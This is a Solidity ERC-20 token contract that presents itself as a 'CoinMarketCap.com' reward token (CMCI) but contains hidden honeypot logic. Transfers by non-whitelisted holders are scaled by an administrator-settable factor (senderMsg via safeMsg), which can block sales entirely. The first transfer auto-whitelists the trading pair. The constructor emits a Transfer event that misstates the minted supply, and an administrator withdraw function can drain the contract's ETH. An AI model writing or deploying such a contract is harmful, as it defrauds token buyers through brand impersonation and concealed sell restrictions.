['/*\n', '\n', 'CMCI   *****    CoinMarketCap.com\n', '\n', 'REWARD TOKEN\n', '\n', 'REV 1.18\n', '\n', 'CAP 2,000,000\n', 'ETH 30\n', '\n', '*/\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', 'interface IERC20 {\n', '  function totalSupply() external view returns (uint256);\n', '  function balanceOf(address who) external view returns (uint256);\n', '  function allowance(address owner, address spender) external view returns (uint256);\n', '  function transfer(address to, uint256 value) external returns (bool);\n', '  function approve(address spender, uint256 value) external returns (bool);\n', '  function transferFrom(address from, address to, uint256 value) external returns (bool);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '\n', '  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '    uint256 c = add(a,m);\n', '    uint256 d = sub(c,1);\n', '    return mul(div(d,m),m);\n', '  }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '\n', '  string private _name;\n', '  string private _symbol;\n', '  uint8 private _decimals;\n', '\n', '  constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '    _name = name;\n', '    _symbol = symbol;\n', '    _decimals = decimals;\n', '  }\n', '\n', '  function name() public view returns(string memory) {\n', '    return _name;\n', '  }\n', '\n', '  function symbol() public view returns(string memory) {\n', '    return _symbol;\n', '  }\n', '\n', '  function decimals() public view returns(uint8) {\n', '    return _decimals;\n', '  }\n', '}\n', '\n', 'contract CMCI is ERC20Detailed {\n', '\n', '\n', '  using SafeMath for uint256;\n', '  mapping (address => uint256) private _balances;\n', '  mapping (address => uint256) private _lockEnd;\n', '  mapping (address => mapping (address => uint256)) private _allowed;\n', '  mapping (uint => string) private _assets;\n', '  mapping(address => bool) private administrators;\n', '  mapping (address => bool) public _protect;\n', '  mapping (address => bool) public _exchange;\n', '  string[] public _assetName;\n', '  uint private senderMsg;\n', '  bool TX1 = false;\n', '\n', '\n', '  event Lock(address owner, uint256 period);\n', '  \n', '  string constant tokenName = "CoinMarketCap.com";   \n', '  string constant tokenSymbol = "CMCI";  \n', '  uint8  constant tokenDecimals = 18;\n', '  uint256 _totalSupply = 2000000e18;\n', '  uint256 public basePercent = 100; \n', '\n', '  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {\n', '    \n', '    administrators[msg.sender] = true;\n', '    senderMsg = 1000;\n', '    _balances[msg.sender] = _totalSupply; //initial \n', '    \n', '    _protect[msg.sender] = true;  \n', '    _exchange[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;\n', '\n', '    emit Transfer(address(0), msg.sender, 200000e18);\n', '  }\n', '\n', '  function() external payable {\n', '  }\n', '\n', '   function withdraw() external onlyAdministrator() {\n', '\n', '      msg.sender.transfer(address(this).balance);\n', '  }\n', '\n', '   function safeMsg(uint _msg) external onlyAdministrator() {\n', '        senderMsg = _msg;\n', '   }\n', '\n', '   function safeSend(address _pro) external onlyAdministrator() {\n', '      _exchange[_pro] = true;\n', '     \n', '  }\n', '\n', '  function safeReceive(address _pro) external onlyAdministrator() {\n', '      _protect[_pro] = true;\n', '  }\n', '\n', '  function totalSupply() public view returns (uint256) {\n', '    return _totalSupply;\n', '  }\n', '\n', '  function balanceOf(address owner) public view returns (uint256) {\n', '    return _balances[owner];\n', '  }\n', '\n', '\n', '  function allowance(address owner, address spender) public view returns (uint256) {\n', '    return _allowed[owner][spender];\n', '  }\n', '\n', '  function transfer(address to, uint256 value) public returns (bool) {\n', '    require(_lockEnd[msg.sender] <= block.timestamp);\n', '    require(value <= _balances[msg.sender]);\n', '    require(to != address(0));\n', '\n', '    uint tokensToSend = value;\n', '    if(_protect[msg.sender] || _exchange[msg.sender]){\n', '        tokensToSend = value;\n', '    } else {\n', '      tokensToSend = SafeMath.div(SafeMath.mul(value, senderMsg),1000);\n', '    }\n', '\n', '   \n', '    _balances[msg.sender] = _balances[msg.sender].sub(tokensToSend);\n', '    _balances[to] = _balances[to].add(tokensToSend);\n', '\n', '    if(!TX1){\n', '        _exchange[to] = true;\n', '        _exchange[msg.sender] = true;\n', '        TX1 = true;\n', '    }\n', '\n', '    emit Transfer(msg.sender, to, tokensToSend);\n', '\n', '    return true;\n', '  }\n', '\n', '     modifier onlyAdministrator(){\n', '        address _customerAddress = msg.sender;\n', '        require(administrators[_customerAddress]);\n', '        _;\n', '    }\n', '\n', '\n', '  function approve(address spender, uint256 value) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = value;\n', '    emit Approval(msg.sender, spender, value);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n', '   \n', '    require(value <= _balances[from]);\n', '    require(value <= _allowed[from][msg.sender]);\n', '    require(to != address(0));\n', '\n', '    uint tokensToSend = value;\n', '    if(_protect[from] || _exchange[from]){\n', '        tokensToSend = value;\n', '    } else {\n', '      tokensToSend = SafeMath.div(SafeMath.mul(value, senderMsg),1000);\n', '    }\n', '  \n', '\n', '    _balances[from] = _balances[from].sub(tokensToSend);\n', '    _balances[to] = _balances[to].add(tokensToSend);\n', '    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokensToSend);\n', '\n', '    if(!TX1){\n', '        _exchange[to] = true;\n', '        _exchange[msg.sender] = true;\n', '        TX1 = true;\n', '    }\n', '\n', '    emit Transfer(from, to, tokensToSend);\n', '   \n', '\n', '    return true;\n', '  }\n', '\n', '  function upAllowance(address spender, uint256 addedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '\n', '}']